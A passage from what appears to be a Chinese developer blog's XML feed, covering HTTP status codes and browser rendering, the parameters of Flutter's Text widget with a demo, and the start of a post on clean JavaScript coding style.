alt></p><p>在响应结果中都会有个一个HTTP状态码，比如我们熟知的200、301、404、500等。通过这个状态码我们可以知道服务器端的处理是否正常，并能了解具体的错误。<br>状态码由3位数字和原因短语组成。根据首位数字，状态码可以分为五类：</p><table><thead><tr><th>状态码</th><th>类别</th><th>说明</th></tr></thead><tbody><tr><td>1–</td><td>信息性状态码</td><td>接收的请求正在处理</td></tr><tr><td>2–</td><td>成功状态码</td><td>请求正常处理完毕</td></tr><tr><td>3–</td><td>重定向状态码</td><td>需要进行附加操作已完成请求</td></tr><tr><td>4–</td><td>客户端错误状态码</td><td>服务器无法处理请求</td></tr><tr><td>5–</td><td>服务器错误状态码</td><td>服务器处理请求出错</td></tr></tbody></table><p>从上面的URL请求我们能看到headers里面的Accept是text/html类型，这部分头部说明了浏览器将响应内容作为HTML渲染，而不是作为文件下载。浏览器将使用头部决定如何解释响应结果，当然也会考虑其他因素，比如URL的扩展情况。</p><h3 id="浏览器渲染解析"><a href="#浏览器渲染解析" class="headerlink" title="浏览器渲染解析"></a>浏览器渲染解析</h3><p>当浏览器获得一个html文件时，会“自上而下”加载，并在加载过程中进行解析渲染。<br>解析：</p><ol><li>浏览器会将HTML解析成一个DOM树，DOM 树的构建过程是一个深度遍历过程：当前节点的所有子节点都构建好后才会去构建当前节点的下一个兄弟节点。</li><li>将CSS解析成 CSS Rule Tree 。</li><li>根据DOM树和CSSOM来构造 Rendering Tree。注意：Rendering Tree 渲染树并不等同于 DOM 树，因为一些像 Header 或 display:none 的东西就没必要放在渲染树中了。</li></ol>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> web </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Flutter Text参数详解</title>
      <link href="2019/10/14/flutterText/"/>
      <url>2019/10/14/flutterText/</url>
      
        <content type="html"><![CDATA[<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p><img src="https://tva1.sinaimg.cn/large/006y8mN6ly1g7rseyioutj30u01sxk21.jpg" alt="Simulator Screen Shot - iPhone 11 Pro Max - 2019-10-09 at 11.23.59"></p><h2 id="API"><a href="#API" class="headerlink" title="API"></a>API</h2><p>Text，很常用的一个Widget；用于显示简单样式文本，它包含一些控制文本显示样式的一些属性</p><p>text构造方法源码：</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">/// If the [style] argument is null, the text will use the style from the</span>  <span class="token comment" spellcheck="true">/// closest enclosing [DefaultTextStyle].</span>  <span class="token comment" spellcheck="true">///</span>  <span class="token comment" spellcheck="true">/// The [data] parameter must not be null.</span>  <span class="token keyword">const</span> <span class="token function">Text</span><span class="token punctuation">(</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>data<span class="token punctuation">,</span> <span class="token punctuation">{</span>    Key key<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>strutStyle<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textAlign<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textDirection<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>locale<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>softWrap<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>overflow<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textScaleFactor<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>maxLines<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>semanticsLabel<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textWidthBasis<span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">assert</span><span class="token punctuation">(</span>         data <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>         <span class="token string">'A non-null String must be provided to a Text widget.'</span><span class="token punctuation">,</span>       <span class="token punctuation">)</span><span class="token punctuation">,</span>       textSpan <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>       <span class="token keyword">super</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">/// Creates a text widget with a [InlineSpan].</span>  <span class="token comment" spellcheck="true">///</span>  <span class="token comment" spellcheck="true">/// The following subclasses of [InlineSpan] may be used to build rich text:</span>  <span class="token comment" spellcheck="true">///</span>  <span class="token comment" spellcheck="true">/// * [TextSpan]s define text and children [InlineSpan]s.</span>  <span class="token comment" spellcheck="true">/// * [WidgetSpan]s define embedded inline widgets.</span>  <span class="token comment" spellcheck="true">///</span>  <span class="token comment" spellcheck="true">/// The [textSpan] parameter must not be null.</span>  <span class="token comment" spellcheck="true">///</span>  <span class="token comment" spellcheck="true">/// See [RichText] which provides a lower-level way to draw text.</span>  <span class="token keyword">const</span> Text<span class="token punctuation">.</span><span class="token function">rich</span><span class="token punctuation">(</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textSpan<span class="token punctuation">,</span> <span class="token punctuation">{</span>    Key key<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>style<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>strutStyle<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textAlign<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textDirection<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>locale<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>softWrap<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>overflow<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textScaleFactor<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>maxLines<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>semanticsLabel<span class="token punctuation">,</span>    <span class="token keyword">this</span><span class="token punctuation">.</span>textWidthBasis<span class="token punctuation">,</span>  <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token function">assert</span><span class="token punctuation">(</span>         textSpan <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>         <span class="token string">'A non-null TextSpan must be provided to a Text.rich widget.'</span><span class="token punctuation">,</span>       <span class="token punctuation">)</span><span class="token punctuation">,</span>       data <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">,</span>       <span class="token keyword">super</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> key<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数详解：</p><h2 id="data"><a href="#data" class="headerlink" title="data"></a>data</h2><p>要显示的字符串</p><h2 id="style样式TextStyle"><a href="#style样式TextStyle" class="headerlink" title="style样式TextStyle"></a>style样式TextStyle</h2><p>TextStyle的构造函数：</p><pre><code>const TextStyle({    this.inherit = true,    this.color,    this.backgroundColor,    this.fontSize,    this.fontWeight,    this.fontStyle,    this.letterSpacing,    this.wordSpacing,    this.textBaseline,    this.height,    this.locale,    this.foreground,    this.background,    this.shadows,    this.fontFeatures,    this.decoration,    this.decorationColor,    this.decorationStyle,    this.decorationThickness,    this.debugLabel,    String fontFamily,    List&lt;String&gt; fontFamilyFallback,    String package,  }) : fontFamily = package == null ? fontFamily : &#39;packages/$package/$fontFamily&#39;,       _fontFamilyFallback = fontFamilyFallback,       _package = package,       assert(inherit != null),       assert(color == null || foreground == null, _kColorForegroundWarning),       assert(backgroundColor == null || background == null, _kColorBackgroundWarning);</code></pre><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>inherit</td><td>是否将<code>null</code>值替换为祖先文本样式中的值（例如，在<a href="https://docs.flutter.io/flutter/painting/TextSpan-class.html" target="_blank" rel="noopener">TextSpan</a>树中）。如果为false，则没有显式值的属性将恢复为默认值：白色，字体大小为10像素，采用无衬线字体。</td></tr><tr><td>color</td><td>字体颜色 如自定义颜色：Color.fromRGBO(155, 155, 155, 1) 也可以使用Colors类里面自带的属性</td></tr><tr><td>backgroundColor</td><td>文本的背景颜色</td></tr><tr><td>fontSize</td><td>字体大小，默认14像素</td></tr><tr><td>fontWeight</td><td>字体厚度，可以使文本变粗或变细<br>FontWeight.bold 常用的字体重量比正常重。即w700<br>FontWeight.normal 默认字体粗细。即w400<br>FontWeight.w100 薄，最薄<br>FontWeight.w200 特轻<br>FontWeight.w300 轻<br>FontWeight.w400 正常/普通/平原<br>FontWeight.w500 较粗<br>FontWeight.w600 半粗体<br>FontWeight.w700 加粗<br>FontWeight.w800 特粗<br>FontWeight.w900 最粗<br></td></tr><tr><td>fontStyle</td><td>字体变体：<br>FontStyle.italic 使用斜体<br>FontStyle.normal 使用直立</td></tr><tr><td>letterSpacing</td><td>水平字母之间的空间间隔（逻辑像素为单位）。可以使用负值来让字母更接近。</td></tr><tr><td>wordSpacing</td><td>单词之间添加的空间间隔（逻辑像素为单位）。可以使用负值来使单词更接近。</td></tr><tr><td>textBaseline</td><td>对齐文本的水平线:<br>TextBaseline.alphabetic：文本基线是标准的字母基线<br>TextBaseline.ideographic：文字基线是表意字基线；<br>如果字符本身超出了alphabetic 基线，那么ideograhpic基线位置在字符本身的底部。</td></tr><tr><td>height</td><td>文本行与行的高度，作为字体大小的倍数（取值1~2，如1.2）</td></tr><tr><td>locale</td><td>文本的前景色，不能与color共同设置（比文本颜色color区别在Paint功能多，后续会讲解）</td></tr><tr><td>background</td><td>文本背景色Paint()..color = backgroundColor</td></tr><tr><td>foreground</td><td>文本的前景色，不能与color共同设置</td></tr><tr><td>shadows</td><td>文本的阴影可以利用列表叠加处理，例如shadows: [Shadow(color:Colors.black,offset: Offset(6, 3), blurRadius: 10)], color即阴影的颜色， offset即阴影相对文本的偏移坐标，blurRadius即阴影的模糊程度，越小越清晰</td></tr><tr><td>decoration</td><td>文字的线性装饰，比如 <code>TextDecoration.underline</code> 下划线， <code>TextDecoration.lineThrough</code>删除线</td></tr><tr><td>decorationColor</td><td>文本装饰线的颜色</td></tr><tr><td>decorationStyle</td><td>文本装饰线的样式，比如 <code>TextDecorationStyle.dashed</code> 虚线</td></tr></tbody></table><h3 id="textAlign"><a href="#textAlign" class="headerlink" title="textAlign"></a>textAlign</h3><p>文本应如何水平对齐enum：</p><table><thead><tr><th>可选值</th><th>说明</th></tr></thead><tbody><tr><td>TextAlign.center</td><td>将文本对齐容器的中心。</td></tr><tr><td>TextAlign.end</td><td>对齐容器后缘上的文本。</td></tr><tr><td>TextAlign.start</td><td>对齐容器前缘上的文本。</td></tr><tr><td>TextAlign.justify</td><td>拉伸以结束的文本行以填充容器的宽度。即使用了decorationStyle才起效</td></tr><tr><td>TextAlign.left</td><td>对齐容器左边缘的文本。</td></tr><tr><td>TextAlign.right</td><td>对齐容器右边缘的文本。</td></tr></tbody></table><h2 id="textDirection"><a href="#textDirection" class="headerlink" title="textDirection"></a>textDirection</h2><p>相对TextAlign中的start、end而言有用（当start使用了ltr相当于end使用了rtl，也相当于TextAlign使用了left）</p><table><thead><tr><th>可选值</th><th>说明</th></tr></thead><tbody><tr><td><a href="https://docs.flutter.io/flutter/dart-ui/TextDirection-class.html" target="_blank" rel="noopener">TextDirection.ltr</a></td><td>ltr从左至右，</td></tr><tr><td><a href="https://docs.flutter.io/flutter/dart-ui/TextDirection-class.html" target="_blank" rel="noopener">TextDirection.rtl</a></td><td>rtl从右至左</td></tr></tbody></table><h2 id="softWrap"><a href="#softWrap" class="headerlink" title="softWrap"></a>softWrap</h2><p>是否自动换行（true自动换行，false单行显示，超出屏幕部分默认截断处理）</p><h2 id="overflow"><a href="#overflow" class="headerlink" title="overflow"></a>overflow</h2><p>文字超出屏幕之后的处理方式</p><table><thead><tr><th>可选值</th><th>说明</th></tr></thead><tbody><tr><td>TextOverflow.clip</td><td>剪切溢出的文本以修复其容器。</td></tr><tr><td>TextOverflow.ellipsis</td><td>使用省略号表示文本已溢出。</td></tr><tr><td>TextOverflow.fade</td><td>将溢出的文本淡化为透明。</td></tr></tbody></table><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><table><thead><tr><th>属性</th><th>说明</th></tr></thead><tbody><tr><td>textScaleFactor</td><td>字体显示倍率</td></tr><tr><td>maxLines</td><td>文字显示最大行数</td></tr></tbody></table><h2 id="文本拼接"><a href="#文本拼接" class="headerlink" title="文本拼接"></a>文本拼接</h2><p>在上面的例子中，Text的所有文本内容只能按同一种样式，如果我们需要对一个Text内容的不同部分按照不同的样式显示，这时就可以使用<code>TextSpan</code>，它代表文本的一个“片段”。我们看看TextSpan的定义:</p><pre><code>const TextSpan({  TextStyle style,   Sting text,  List&lt;TextSpan&gt; children,  GestureRecognizer recognizer,});</code></pre><h2 id="Demo源码"><a href="#Demo源码" class="headerlink" title="Demo源码"></a>Demo源码</h2><pre><code>import &#39;dart:math&#39;;import &#39;package:flutter/material.dart&#39;;class TextDemo extends StatelessWidget {  @override  Widget build(BuildContext context) {    return new Scaffold(      appBar: AppBar(        title: Text(&quot;文本测试&quot;),      ),      backgroundColor: Colors.white,      body: buildText(),    );  }  Widget buildText(){    return new SingleChildScrollView(        child: Column(          children: &lt;Widget&gt;[            Text(&#39;普通文本样式&#39;),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;自定义文本颜色&#39;,style: TextStyle(color: Color.fromRGBO(234,200,134,1)),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本背景颜色&#39;,style: TextStyle(backgroundColor: Colors.red),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本字体大小&#39;,style: TextStyle(fontSize: 30.0),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本加粗&#39;,style: TextStyle(fontWeight: FontWeight.w900),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本斜体&#39;,style: TextStyle(fontStyle: FontStyle.italic),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本字母间隙space&#39;,style: TextStyle(letterSpacing: 2),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本单词间距 word space&#39;,style: TextStyle(wordSpacing: 10),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本行高&#39;,style: TextStyle(height: 3, backgroundColor: Colors.red),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本阴影shadows&#39;,style: TextStyle(shadows: [Shadow(color:Colors.black,offset: Offset(6, 3), blurRadius: 10)]),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本文字删除线&#39;,style: TextStyle(decoration: TextDecoration.lineThrough, decorationColor: Colors.red),),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本文字底边线&#39;,style: TextStyle(height: 3, decoration: TextDecoration.underline, decorationStyle: TextDecorationStyle.double),),            ),            Container(              // margin: EdgeInsets.only(top: 50.0, left: 120.0),               constraints: BoxConstraints.tightFor(width: 200.0, height: 50.0), //卡片大小              decoration: BoxDecoration(//背景装饰                  gradient: RadialGradient( //背景径向渐变                      colors: [Colors.red, Colors.orange],                      center: Alignment.topLeft,                      radius: .98                  ),                  boxShadow: [ //卡片阴影                    BoxShadow(                        color: Colors.black54,                        offset: Offset(2.0, 2.0),                        blurRadius: 4.0                    )                  ]              ),              // alignment: Alignment.center,               child: Text(&#39;文本对齐方式&#39;,textAlign: TextAlign.left,),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本换行测试softWrap（自动换行）文本换行测试（自动换行）文本换行测试（自动换行）文本换行测试（自动换行）文本换行测试（自动换行）&#39;, softWrap: true,),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本换行测试softWrap（不换行）文本换行测试（不换行）文本换行测试（不换行）文本换行测试（不换行）文本换行测试（不换行）&#39;, softWrap: false,),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本溢出测试overflow ellipsis文本溢出测试文本溢出测试文本溢出测试文本溢出测试文本溢出测试&#39;, overflow: TextOverflow.ellipsis,),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本溢出测试overflow clip文本溢出测试文本溢出测试文本溢出测试文本溢出测试文本溢出测试&#39;, overflow: TextOverflow.clip,),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本溢出测试overflow fade文本溢出测试文本溢出测试文本溢出测试文本溢出测试文本溢出测试&#39;, overflow: TextOverflow.fade,),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text(&#39;文本显示行数2文本显示行数2文本显示行数2文本显示行数2文本显示行数2文本显示行数2文本显示行数2文本显示行数2文本显示行数2文本显示行数2文本显示行数2&#39;, maxLines: 2,),            ),            Padding(              padding: EdgeInsets.fromLTRB(15, 5, 15, 5),              child: Text.rich(                TextSpan(                  children: [                    TextSpan(                    text:&#39;￥&#39;,                    style: TextStyle(                      color: Color.fromRGBO(255,85,46,1),                      fontSize: 18.0,                      fontWeight: FontWeight.w700                    )                  ),                  TextSpan(                    text: &#39;100&#39;,                    style: TextStyle(                      color: Color.fromRGBO(255,85,46,1),                      fontSize: 24.0,                      //字体加粗                      fontWeight: FontWeight.w700                    )                  ),                  TextSpan(                    text:&#39;1001元&#39;,                    style: TextStyle(                      decoration: TextDecoration.lineThrough,                      color: Color.fromRGBO(153,153,153,1),                      fontSize: 14.0,                      //字体加粗                      // fontWeight: FontWeight.w700                    )                  ),                  TextSpan(                    text:&#39;拼接普通文本拼接普通文本拼接普通文本拼接普通文本拼接普通文本&#39;                  )                  ]                )              ),            ),          ],        ),    );  }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> flutter </category>
          
      </categories>
      
      
        <tags>
            
            <tag> flutter </tag>
            
            <tag> Text </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何写出优雅通俗的JavaScript代码</title>
      <link href="2019/09/20/jsLint/"/>
      <url>2019/09/20/jsLint/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在我们平时的工作开发中，大多数都是大人协同开发的公共项目；在我们平时开发中代码codeing的时候我们考虑代码的<code>可读性</code>、<code>复用性</code>和<code>扩展性</code>。</p><p>干净的代码，既在质量上较为可靠，也为后期维护、升级奠定了良好基础。</p><p>我们从以下几个方面进行探讨：</p><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><h3 id="1、变量命名"><a href="#1、变量命名" class="headerlink" title="1、变量命名"></a>1、变量命名</h3><p>一般我们在定义变量是要使用有意义的词汇命令，要做到见面知义</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">const</span> yyyymmdstr <span class="token operator">=</span> <span class="token function">moment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'YYYY/MM/DD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">const</span> currentDate <span class="token operator">=</span> <span class="token function">moment</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">'YYYY/MM/DD'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2、可描述"><a href="#2、可描述" class="headerlink" title="2、可描述"></a>2、可描述</h3><p>通过一个变量生成了一个新变量，也需要为这个新变量命名，也就是说每个变量当你看到他第一眼你就知道他是干什么的。</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">const</span> ADDRESS <span class="token operator">=</span> <span class="token string">'One Infinite Loop, Cupertino 95014'</span><span class="token punctuation">;</span><span class="token keyword">const</span> CITY_ZIP_CODE_REGEX <span class="token operator">=</span> <span class="token regex">/^[^,\\]+[,\\\s]+(.+?)\s*(\d{5})?$/</span><span class="token punctuation">;</span><span class="token function">saveCityZipCode</span><span class="token punctuation">(</span>ADDRESS<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>CITY_ZIP_CODE_REGEX<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> ADDRESS<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>CITY_ZIP_CODE_REGEX<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">const</span> ADDRESS <span class="token operator">=</span> <span class="token string">'One Infinite Loop, Cupertino 95014'</span><span class="token punctuation">;</span><span class="token keyword">const</span> CITY_ZIP_CODE_REGEX <span class="token operator">=</span> <span class="token regex">/^[^,\\]+[,\\\s]+(.+?)\s*(\d{5})?$/</span><span class="token punctuation">;</span><span class="token keyword">const</span> <span class="token punctuation">[</span><span class="token punctuation">,</span> city<span class="token punctuation">,</span> zipCode<span class="token punctuation">]</span> <span class="token operator">=</span> ADDRESS<span class="token punctuation">.</span><span class="token function">match</span><span class="token punctuation">(</span>CITY_ZIP_CODE_REGEX<span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">saveCityZipCode</span><span class="token punctuation">(</span>city<span class="token punctuation">,</span> zipCode<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3、形参命名"><a href="#3、形参命名" class="headerlink" title="3、形参命名"></a>3、形参命名</h3><p>在for、forEach、map的循环中我们在命名时要直接</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">const</span> locations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Austin'</span><span class="token punctuation">,</span> <span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'San Francisco'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>locations<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">doStuff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">doSomeOtherStuff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// ...</span>  <span class="token comment" spellcheck="true">// ...</span>  <span class="token comment" spellcheck="true">// ...</span>  <span class="token comment" spellcheck="true">// 需要看其他代码才能确定 'l' 是干什么的。</span>  <span class="token function">dispatch</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">const</span> locations <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'Austin'</span><span class="token punctuation">,</span> <span class="token string">'New York'</span><span class="token punctuation">,</span> <span class="token string">'San Francisco'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>locations<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token function">doStuff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">doSomeOtherStuff</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// ...</span>  <span class="token comment" spellcheck="true">// ...</span>  <span class="token comment" spellcheck="true">// ...</span>  <span class="token function">dispatch</span><span class="token punctuation">(</span>location<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4、避免无意义的前缀"><a href="#4、避免无意义的前缀" class="headerlink" title="4、避免无意义的前缀"></a>4、避免无意义的前缀</h3><p>例如我们只创建一个对象是，没有必要再把每个对象的属性上再加上对象名</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">const</span> car <span class="token operator">=</span> <span class="token punctuation">{</span>  carMake<span class="token punctuation">:</span> <span class="token string">'Honda'</span><span class="token punctuation">,</span>  carModel<span class="token punctuation">:</span> <span class="token string">'Accord'</span><span class="token punctuation">,</span>  carColor<span class="token punctuation">:</span> <span class="token string">'Blue'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">paintCar</span><span class="token punctuation">(</span>car<span class="token punctuation">)</span> <span class="token punctuation">{</span>  car<span class="token punctuation">.</span>carColor <span class="token operator">=</span> <span class="token string">'Red'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">const</span> car <span class="token operator">=</span> <span class="token punctuation">{</span>  make<span class="token punctuation">:</span> <span class="token string">'Honda'</span><span class="token punctuation">,</span>  model<span class="token punctuation">:</span> <span class="token string">'Accord'</span><span class="token punctuation">,</span>  color<span class="token punctuation">:</span> <span class="token string">'Blue'</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">paintCar</span><span class="token punctuation">(</span>car<span class="token punctuation">)</span> <span class="token punctuation">{</span>  car<span class="token punctuation">.</span>color <span class="token operator">=</span> <span class="token string">'Red'</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5、默认值"><a href="#5、默认值" class="headerlink" title="5、默认值"></a>5、默认值</h3><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">function</span> <span class="token function">createMicrobrewery</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">const</span> breweryName <span class="token operator">=</span> name <span class="token operator">||</span> <span class="token string">'Hipster Brew Co.'</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">function</span> <span class="token function">createMicrobrewery</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">'Hipster Brew Co.'</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="1、参数"><a href="#1、参数" class="headerlink" title="1、参数"></a>1、参数</h3><p>一般参数多的话要使用ES6的解构传参的方式</p><pre class="line-numbers language-js"><code class="language-js"><span class="token comment" spellcheck="true">//bad code</span><span class="token keyword">function</span> <span class="token function">createMenu</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> body<span class="token punctuation">,</span> buttonText<span class="token punctuation">,</span> cancellable<span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token keyword">function</span> <span class="token function">createMenu</span><span class="token punctuation">(</span><span class="token punctuation">{</span> title<span class="token punctuation">,</span> body<span class="token punctuation">,</span> buttonText<span class="token punctuation">,</span> cancellable <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token comment" spellcheck="true">// ...</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">//better code</span><span class="token function">createMenu</span><span class="token punctuation">(</span><span 